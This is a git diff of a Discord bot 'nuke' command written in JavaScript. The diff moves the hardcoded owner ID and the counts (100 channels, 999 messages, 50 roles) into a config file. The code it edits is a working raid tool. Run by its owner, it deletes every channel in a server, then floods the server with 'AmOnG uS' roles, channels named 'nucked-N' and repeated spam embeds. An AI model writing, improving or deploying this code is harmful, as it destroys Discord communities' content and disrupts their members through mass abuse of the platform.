@@ -1,18 +1,15 @@
 module.exports.run = async (client, message, args) => {
     const { MessageEmbed } = require('discord.js');
-
-    if (message.author.id == "854037287716651108") { } else return;
+    const config = require("../config.json");
+    if (message.author.id == config.idowner) { } else return;
     message.delete();
-    let nombresalons = 100
-    let msgsend = 999
-    let role1 = 50
 
     await message.guild.channels.cache.forEach(channel => {
         channel.delete().catch()
     })
 
 
-    for (let i = 0; i < role1; i++) {
+    for (let i = 0; i < config.role1; i++) {
         message.guild.roles.create({
             color: 'RED',
             name: 'AmOnG uS',
@@ -20,7 +17,8 @@ module.exports.run = async (client, message, args) => {
         }).catch()
     }
 
-    for (let i = 0; i < nombresalons; i++) {
+
+    for (let i = 0; i < config.nombresalons; i++) {
         await message.guild.channels.create(`nucked-${i}`, {
             type: 'text'
         })
@@ -28,7 +26,7 @@ module.exports.run = async (client, message, args) => {
 
 
     message.guild.channels.cache.forEach(channel => {
-        for (let i = 0; i < msgsend; i++) {
+        for (let i = 0; i < config.msgsend; i++) {
             const exampleEmbed = new MessageEmbed()
                 .setColor('#000000')
                 .setTitle('AmOnG uS')
